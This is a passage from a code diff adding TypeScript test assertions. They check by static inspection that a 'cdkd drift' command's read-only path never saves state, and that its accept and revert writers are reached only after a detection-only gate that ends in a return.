+        `${writer} no longer rebuilds the bag by spreading it, so the laundering reasoning ` +
+          'above has to be re-derived for that writer'
+      ).toHaveLength(1);
+    }
+
+    // The INVARIANT the count alone does not establish: the load flow itself
+    // must not persist. Everything above reasons "plain drift cannot write", and
+    // a `saveState` added inside `runDriftForStack` would falsify that while
+    // leaving the spread count untouched — the repair arm would then launder a
+    // record on the read-only path.
+    expect(
+      body.includes('saveState('),
+      'runDriftForStack now writes state, so its REPAIR arm can launder a malformed record.'
+    ).toBe(false);
+    // ...and the two saves that do exist are still the ones this reasoning is
+    // about, so the count above keeps its subject.
+    expect(src.match(/saveState\(/g) ?? []).toHaveLength(2);
+    // ...and each one is INSIDE its own writer. A count alone permits moving a
+    // save up into `driftCommand` ahead of the detection-only gate, where a
+    // read-only run reaches it after the repair arm has already emptied the bag.
+    for (const writer of ['async function runAccept(', 'async function runRevert(']) {
+      expect(
+        flow(src, writer).match(/saveState\(/g) ?? [],
+        `${writer} no longer holds exactly one saveState, so a write may have moved out of it`
+      ).toHaveLength(1);
+    }
+
+    // The GATE, which neither of the two above establishes: a detection-only
+    // run must not REACH either writer. Replacing that condition with `false`
+    // leaves the loader save-free and the save count unchanged while plain
+    // `cdkd drift` falls through to `runRevert` — and then the repair arm has
+    // laundered a record for a run that writes.
+    const gateAt = src.indexOf('if (!options.accept && !options.revert) {');
+    expect(gateAt, 'plain `cdkd drift` is no longer gated before the writers').toBeGreaterThan(-1);
+    // TERMINATION, not the gate's text: emptying its body leaves the condition,
+    // the selector and the writer counts all intact while a detection-only run
+    // falls straight through to `runAccept` / `runRevert`.
+    const gateBody = src.slice(gateAt, matchingCloseBrace(src, src.indexOf('{', gateAt)));
+    // Indentation-INSENSITIVE: an earlier cut hard-coded 6- and 4-space
+    // indents, so re-nesting the gate would have reddened it for a cosmetic
+    // reason. What matters is that the last statement before its closing brace
+    // is a `return`, which is what stops a non-drifted run falling through.
+    const gateStatements = gateBody
+      .slice(gateBody.indexOf('{') + 1, gateBody.lastIndexOf('}'))
+      .split('\n')
+      .map((line) => line.trim())
+      .filter(Boolean);
+    expect(
+      gateStatements[gateStatements.length - 1],
+      'the detection-only gate no longer ENDS by returning, so a non-drifted run falls through'
+    ).toBe('return;');
+    // The writers are reached only from the other side of that gate, and only
+    // one of them per run.
+    const selectorAt = src.indexOf('if (options.accept) {');
+    expect(selectorAt, 'the writers are no longer selected by options.accept').toBeGreaterThan(-1);
+    const acceptAt = src.indexOf('await runAccept(');
+    const revertAt = src.indexOf('await runRevert(');
+    // OPPOSITE ARMS of that selector, so a run cannot execute both. Replacing
+    // the `else` with an unconditional block keeps both counts at one and both
+    // calls after the gate, while an accepting run also reverts.
+    const selectorClose = matchingCloseBrace(src, src.indexOf('{', selectorAt));
+    expect(src.slice(selectorClose - 1).startsWith('} else {'), 'the writer selector lost its else').toBe(
+      true
+    );
+    const acceptArm = src.slice(selectorAt, selectorClose - 1);
+    const revertArm = src.slice(selectorClose - 1, matchingCloseBrace(src, src.indexOf('{', selectorClose - 1)));
+    expect(acceptArm, 'runAccept left the accept arm').toContain('await runAccept(');
+    expect(acceptArm, 'runRevert leaked into the accept arm').not.toContain('await runRevert(');
+    expect(revertArm, 'runRevert left the else arm').toContain('await runRevert(');
+    expect(revertArm, 'runAccept leaked into the else arm').not.toContain('await runAccept(');
+    expect(src.match(/await runAccept\(/g) ?? []).toHaveLength(1);
+    expect(src.match(/await runRevert\(/g) ?? []).toHaveLength(1);
+    // DOMINANCE, not just presence: moving the whole gate BELOW the two writer
+    // calls leaves its condition, its terminating body and both call counts
+    // intact while a detection-only run reaches a writer first.
+    // AFTER the gate's CLOSING BRACE, not merely after its start: moving a
+    // writer call INTO the gate's body keeps every count, keeps the body ending
+    // in `return`, and keeps `gateAt < writerAt` true, while plain drift reaches
+    // that writer.
+    const gateEnd = matchingCloseBrace(src, src.indexOf('{', gateAt));
+    expect(acceptAt, 'runAccept moved INSIDE the detection-only gate').toBeGreaterThan(gateEnd);
+    expect(revertAt, 'runRevert moved INSIDE the detection-only gate').toBeGreaterThan(gateEnd);
   });
 });
